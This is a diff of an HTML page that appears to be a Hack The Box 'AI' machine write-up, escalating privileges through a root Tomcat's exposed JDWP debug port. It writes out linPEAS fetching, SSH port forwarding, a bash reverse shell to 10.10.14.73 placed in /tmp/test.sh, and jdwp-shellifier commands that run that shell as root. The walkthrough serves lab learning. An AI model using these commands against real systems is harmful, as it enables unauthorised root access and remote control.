+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>git clone https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite.git
 </span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">cd</span> privilege-escalation-awesome-scripts-suite/linPEAS/
 </span></span><span style="display:flex;"><span>python3 -m http.server <span style="color:#bd93f9">80</span>
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>On the remote machine, we run linpeas.sh that informs us of a process running Java in debug mode with jdwp on port 8000 (it is &gt;99% a privilege escalation vector)
+</span></span></code></pre></div><p>On the remote machine, we run linpeas.sh that informs us of a process running Java in debug mode with jdwp on port 8000 (it is &gt;99% a privilege escalation vector)
 <a href="https://ioactive.com/hacking-java-debug-wire-protocol-or-how/">JDWP exploitation</a>
 We are also informed tomcat is running on port 8080, so if we can access the tomcat manager we may be able to upload an executable war file</p>
-<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
-<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6
-</span></code></pre></td>
-<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>curl 10.10.14.73
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>curl 10.10.14.73
 </span></span><span style="display:flex;"><span>curl -O 10.10.14.73/linpeas.sh
 </span></span><span style="display:flex;"><span>chmod +x linpeas.sh
 </span></span><span style="display:flex;"><span>./linpeas.sh
 </span></span><span style="display:flex;"><span><span style="color:#ff79c6">[</span>..<span style="color:#ff79c6">]</span>
 </span></span><span style="display:flex;"><span>root     <span style="color:#bd93f9">129808</span>  7.7  4.6 <span style="color:#bd93f9">3108796</span> <span style="color:#bd93f9">93232</span> ?       Sl   14:22   0:04 /usr/bin/java -Djava.util.logging.config.file<span style="color:#ff79c6">=</span>/opt/apache-tomcat-9.0.27/conf/logging.properties -Djava.util.logging.manager<span style="color:#ff79c6">=</span>org.apache.juli.ClassLoaderLogManager -Djdk.tls.ephemeralDHKeySize<span style="color:#ff79c6">=</span><span style="color:#bd93f9">2048</span> -Djava.protocol.handler.pkgs<span style="color:#ff79c6">=</span>org.apache.catalina.webresources -Dorg.apache.catalina.security.SecurityListener.UMASK<span style="color:#ff79c6">=</span><span style="color:#bd93f9">0027</span> -agentlib:jdwp<span style="color:#ff79c6">=</span><span style="color:#8be9fd;font-style:italic">transport</span><span style="color:#ff79c6">=</span>dt_socket,address<span style="color:#ff79c6">=</span>localhost:8000,server<span style="color:#ff79c6">=</span>y,suspend<span style="color:#ff79c6">=</span>n -Dignore.endorsed.dirs<span style="color:#ff79c6">=</span> -classpath /opt/apache-tomcat-9.0.27/bin/bootstrap.jar:/opt/apache-tomcat-9.0.27/bin/tomcat-juli.jar -Dcatalina.base<span style="color:#ff79c6">=</span>/opt/apache-tomcat-9.0.27 -Dcatalina.home<span style="color:#ff79c6">=</span>/opt/apache-tomcat-9.0.27 -Djava.io.tmpdir<span style="color:#ff79c6">=</span>/opt/apache-tomcat-9.0.27/temp org.apache.catalina.startup.Bootstrap start
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>We can further spot a running server on port 8009 which is ajp (tomcat redirector).
+</span></span></code></pre></div><p>We can further spot a running server on port 8009 which is ajp (tomcat redirector).
 If we are not succesful with JDWP exploitation, then we can explore the following resource: <a href="https://ionize.com.au/exploiting-apache-tomcat-port-8009-using-apache-jserv-protocol/">Exploiting Tomcat Apach JServ Protocol using port 8009</a></p>
-<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
-<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">7
-</span></code></pre></td>
-<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>alexa@AI:~$ ss -lntp
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>alexa@AI:~$ ss -lntp
 </span></span><span style="display:flex;"><span>State          Recv-Q          Send-Q                           Local Address:Port                     Peer Address:Port
 </span></span><span style="display:flex;"><span><span style="color:#ff79c6">[</span>..<span style="color:#ff79c6">]</span>
 </span></span><span style="display:flex;"><span>LISTEN         <span style="color:#bd93f9">0</span>               <span style="color:#bd93f9">1</span>                                    127.0.0.1:8000                          0.0.0.0:*
 </span></span><span style="display:flex;"><span>LISTEN         <span style="color:#bd93f9">0</span>               <span style="color:#bd93f9">100</span>                         <span style="color:#ff79c6">[</span>::ffff:127.0.0.1<span style="color:#ff79c6">]</span>:8080                                *:*
 </span></span><span style="display:flex;"><span>LISTEN         <span style="color:#bd93f9">0</span>               <span style="color:#bd93f9">1</span>                           <span style="color:#ff79c6">[</span>::ffff:127.0.0.1<span style="color:#ff79c6">]</span>:8005                                *:*
 </span></span><span style="display:flex;"><span>LISTEN         <span style="color:#bd93f9">0</span>               <span style="color:#bd93f9">100</span>                         <span style="color:#ff79c6">[</span>::ffff:127.0.0.1<span style="color:#ff79c6">]</span>:8009                                *:*
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>We establish an ssh connection with user alexa, then we execute <code>~C</code>to get the ssh command cli for the purpose of adding port <a href="https://unix.stackexchange.com/questions/30515/how-to-setup-port-redirection-after-a-ssh-connection-has-been-opened">forwarding rules</a>.</p>
-<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
-<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6
-</span></code></pre></td>
-<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>alexa@AI:~$ ~C
+</span></span></code></pre></div><p>We establish an ssh connection with user alexa, then we execute <code>~C</code>to get the ssh command cli for the purpose of adding port <a href="https://unix.stackexchange.com/questions/30515/how-to-setup-port-redirection-after-a-ssh-connection-has-been-opened">forwarding rules</a>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>alexa@AI:~$ ~C
 </span></span><span style="display:flex;"><span>ssh&gt; <span style="color:#8be9fd;font-style:italic">help</span>
 </span></span><span style="display:flex;"><span>ssh&gt; -L8000:127.0.0.1:8000
 </span></span><span style="display:flex;"><span>bind: Cannot assign requested address
 </span></span><span style="display:flex;"><span>Forwarding port.
 </span></span><span style="display:flex;"><span>alexa@AI:~$
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>If we look now at our local machine, the port forwarding is effective</p>
-<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
-<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
-</span></code></pre></td>
-<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ctf@15bec4805337:~/htb$ ss -lntp
+</span></span></code></pre></div><p>If we look now at our local machine, the port forwarding is effective</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ctf@15bec4805337:~/htb$ ss -lntp
 </span></span><span style="display:flex;"><span>State     Recv-Q     Send-Q           Local Address:Port           Peer Address:Port
 </span></span><span style="display:flex;"><span>LISTEN    <span style="color:#bd93f9">0</span>          <span style="color:#bd93f9">0</span>                    127.0.0.1:8000                0.0.0.0:*         users:<span style="color:#ff79c6">((</span><span style="color:#f1fa8c">&#34;ssh&#34;</span>,pid<span style="color:#ff79c6">=</span>23365,fd<span style="color:#ff79c6">=</span>7<span style="color:#ff79c6">))</span>
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>We are now able to use local port 8000 to connect the remote JDWP port.
+</span></span></code></pre></div><p>We are now able to use local port 8000 to connect the remote JDWP port.
 We will use the exploit: <a href="https://github.com/IOActive/jdwp-shellifier">Git Hub JDWP shellifier</a>
 Running jdwp shellifier, we identify server is running OpenJDK 11.0.4, so we can install it locally to run jdb the Java Debugger</p>
-<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
-<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">7
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">8
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">9
-</span></code></pre></td>
-<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>./jdwp-shellifier.py -t 127.0.0.1 -p <span style="color:#bd93f9">8000</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>./jdwp-shellifier.py -t 127.0.0.1 -p <span style="color:#bd93f9">8000</span>
 </span></span><span style="display:flex;"><span><span style="color:#ff79c6">[</span>+<span style="color:#ff79c6">]</span> Targeting <span style="color:#f1fa8c">&#39;127.0.0.1:8000&#39;</span>
 </span></span><span style="display:flex;"><span><span style="color:#ff79c6">[</span>+<span style="color:#ff79c6">]</span> Reading settings <span style="color:#ff79c6">for</span> <span style="color:#f1fa8c">&#39;OpenJDK 64-Bit Server VM - 11.0.4&#39;</span>
 </span></span><span style="display:flex;"><span><span style="color:#ff79c6">[</span>+<span style="color:#ff79c6">]</span> Found Runtime class: <span style="color:#8be9fd;font-style:italic">id</span><span style="color:#ff79c6">=</span>b8c
@@ -591,49 +349,15 @@ Running jdwp shellifier, we identify server is running OpenJDK 11.0.4, so we can
 </span></span><span style="display:flex;"><span><span style="color:#ff79c6">[</span>+<span style="color:#ff79c6">]</span> Waiting <span style="color:#ff79c6">for</span> an event on <span style="color:#f1fa8c">&#39;java.net.ServerSocket.accept&#39;</span>
 </span></span><span style="display:flex;"><span>^C<span style="color:#ff79c6">[</span>+<span style="color:#ff79c6">]</span> Exiting on user&#39;s request
 </span></span><span style="display:flex;"><span>sudo apt install openjdk-11-jdk
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>In the server, using alexa account, we can create a reverse-shell script from <a href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">pentestmonkey</a></p>
-<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
-<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
-</span></code></pre></td>
-<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>cat &gt;&gt; /tmp/test.sh <span style="color:#f1fa8c">&lt;&lt; EOF
+</span></span></code></pre></div><p>In the server, using alexa account, we can create a reverse-shell script from <a href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">pentestmonkey</a></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>cat &gt;&gt; /tmp/test.sh <span style="color:#f1fa8c">&lt;&lt; EOF
 </span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">#!/bin/bash
 </span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">bash -i &gt;&amp; /dev/tcp/10.10.14.73/8080 0&gt;&amp;1
 </span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">EOF</span>
 </span></span><span style="display:flex;"><span>chmod a+x /tmp/test.sh
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>We prepare the server in our local machine with <code>nc -lntp 8080</code> and we test the reverse-shell is working.
+</span></span></code></pre></div><p>We prepare the server in our local machine with <code>nc -lntp 8080</code> and we test the reverse-shell is working.
 Now we need to figure out how to execute the script as root: Exploiting JDWP would be a good idea</p>
-<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
-<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
-</span></code></pre></td>
-<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>jdb <span style="color:#ff79c6">-</span>attach 127<span style="color:#ff79c6">.</span><span style="color:#50fa7b">0</span><span style="color:#ff79c6">.</span><span style="color:#50fa7b">0</span><span style="color:#ff79c6">.</span><span style="color:#50fa7b">1</span><span style="color:#ff79c6">:</span>8000
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>jdb <span style="color:#ff79c6">-</span>attach <span style="color:#bd93f9">127.0.0.1</span><span style="color:#ff79c6">:</span><span style="color:#bd93f9">8000</span>
 </span></span><span style="display:flex;"><span>Set uncaught java<span style="color:#ff79c6">.</span><span style="color:#50fa7b">lang</span><span style="color:#ff79c6">.</span><span style="color:#50fa7b">Throwable</span>
 </span></span><span style="display:flex;"><span>Set deferred uncaught java<span style="color:#ff79c6">.</span><span style="color:#50fa7b">lang</span><span style="color:#ff79c6">.</span><span style="color:#50fa7b">Throwable</span>
 </span></span><span style="display:flex;"><span>Initializing jdb <span style="color:#ff79c6">...</span>
@@ -646,68 +370,29 @@ Now we need to figure out how to execute the script as root: Exploiting JDWP wou
 </span></span><span style="display:flex;"><span>com<span style="color:#ff79c6">.</span><span style="color:#50fa7b">sun</span><span style="color:#ff79c6">.</span><span style="color:#50fa7b">tools</span><span style="color:#ff79c6">.</span><span style="color:#50fa7b">example</span><span style="color:#ff79c6">.</span><span style="color:#50fa7b">debug</span><span style="color:#ff79c6">.</span><span style="color:#50fa7b">expr</span><span style="color:#ff79c6">.</span><span style="color:#50fa7b">ParseException</span><span style="color:#ff79c6">:</span> Unable to create java<span style="color:#ff79c6">.</span><span style="color:#50fa7b">lang</span><span style="color:#ff79c6">.</span><span style="color:#50fa7b">Runtime</span> instance
 </span></span><span style="display:flex;"><span> <span style="color:#ff79c6">new</span> java<span style="color:#ff79c6">.</span><span style="color:#50fa7b">lang</span><span style="color:#ff79c6">.</span><span style="color:#50fa7b">Runtime</span><span style="color:#ff79c6">().</span><span style="color:#50fa7b">exec</span><span style="color:#ff79c6">(</span><span style="color:#f1fa8c">&#34;/bin/sh /tmp/test.sh&#34;</span><span style="color:#ff79c6">)</span> <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">null</span>
 </span></span><span style="display:flex;"><span><span style="color:#ff79c6">&gt;</span>
-</span></span><span style="display:flex;"><span>Breakpoint hit<span style="color:#ff79c6">:</span> <span style="color:#f1fa8c">&#34;thread=main&#34;</span><span style="color:#ff79c6">,</span> java<span style="color:#ff79c6">.</span><span style="color:#50fa7b">lang</span><span style="color:#ff79c6">.</span><span style="color:#50fa7b">String</span><span style="color:#ff79c6">.</span><span style="color:#50fa7b">indexOf</span><span style="color:#ff79c6">(),</span> line<span style="color:#ff79c6">=</span>1<span style="color:#ff79c6">,</span>535 bci<span style="color:#ff79c6">=</span>0
+</span></span><span style="display:flex;"><span>Breakpoint hit<span style="color:#ff79c6">:</span> <span style="color:#f1fa8c">&#34;thread=main&#34;</span><span style="color:#ff79c6">,</span> java<span style="color:#ff79c6">.</span><span style="color:#50fa7b">lang</span><span style="color:#ff79c6">.</span><span style="color:#50fa7b">String</span><span style="color:#ff79c6">.</span><span style="color:#50fa7b">indexOf</span><span style="color:#ff79c6">(),</span> line<span style="color:#ff79c6">=</span><span style="color:#bd93f9">1</span><span style="color:#ff79c6">,</span><span style="color:#bd93f9">535</span> bci<span style="color:#ff79c6">=</span><span style="color:#bd93f9">0</span>
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>main<span style="color:#ff79c6">[</span>1<span style="color:#ff79c6">]</span>
+</span></span><span style="display:flex;"><span>main<span style="color:#ff79c6">[</span><span style="color:#bd93f9">1</span><span style="color:#ff79c6">]</span>
 </span></span><span style="display:flex;"><span>The application has been disconnected
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>We get many disconnections and executing the command is not always successful, so we will exploit using jdwp-shellifier.py instead.
+</span></span></code></pre></div><p>We get many disconnections and executing the command is not always successful, so we will exploit using jdwp-shellifier.py instead.
 Trying to break on java.lang.String.indexOf was not very successful; however using instead org.apache.tomcat.util.net.NioBlockingSelector$BlockPoller.events worked</p>
-<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
-<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
-</span></code></pre></td>
-<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>#<span style="color:#ff79c6">./</span>jdwp<span style="color:#ff79c6">-</span>shellifier<span style="color:#ff79c6">.</span><span style="color:#50fa7b">py</span> <span style="color:#ff79c6">-</span>t 127<span style="color:#ff79c6">.</span><span style="color:#50fa7b">0</span><span style="color:#ff79c6">.</span><span style="color:#50fa7b">0</span><span style="color:#ff79c6">.</span><span style="color:#50fa7b">1</span> <span style="color:#ff79c6">-</span>p 8000 <span style="color:#ff79c6">--</span><span style="color:#ff79c6">break</span><span style="color:#ff79c6">-</span>on <span style="color:#f1fa8c">&#34;java.lang.String.indexOf&#34;</span> <span style="color:#ff79c6">--</span>cmd <span style="color:#ff79c6">/</span>tmp<span style="color:#ff79c6">/</span>test<span style="color:#ff79c6">.</span><span style="color:#50fa7b">sh</span>
-</span></span><span style="display:flex;"><span><span style="color:#ff79c6">./</span>jdwp<span style="color:#ff79c6">-</span>shellifier<span style="color:#ff79c6">.</span><span style="color:#50fa7b">py</span> <span style="color:#ff79c6">-</span>t 127<span style="color:#ff79c6">.</span><span style="color:#50fa7b">0</span><span style="color:#ff79c6">.</span><span style="color:#50fa7b">0</span><span style="color:#ff79c6">.</span><span style="color:#50fa7b">1</span> <span style="color:#ff79c6">-</span>p 8000 <span style="color:#ff79c6">--</span><span style="color:#ff79c6">break</span><span style="color:#ff79c6">-</span>on <span style="color:#f1fa8c">&#34;org.apache.tomcat.util.net.NioBlockingSelector\$BlockPoller.events&#34;</span> <span style="color:#ff79c6">--</span>cmd <span style="color:#ff79c6">/</span>tmp<span style="color:#ff79c6">/</span>test<span style="color:#ff79c6">.</span><span style="color:#50fa7b">sh</span>
-</span></span><span style="display:flex;"><span><span style="color:#ff79c6">[+]</span> Targeting &#39;127<span style="color:#ff79c6">.</span><span style="color:#50fa7b">0</span><span style="color:#ff79c6">.</span><span style="color:#50fa7b">0</span><span style="color:#ff79c6">.</span><span style="color:#50fa7b">1</span><span style="color:#ff79c6">:</span>8000&#39;
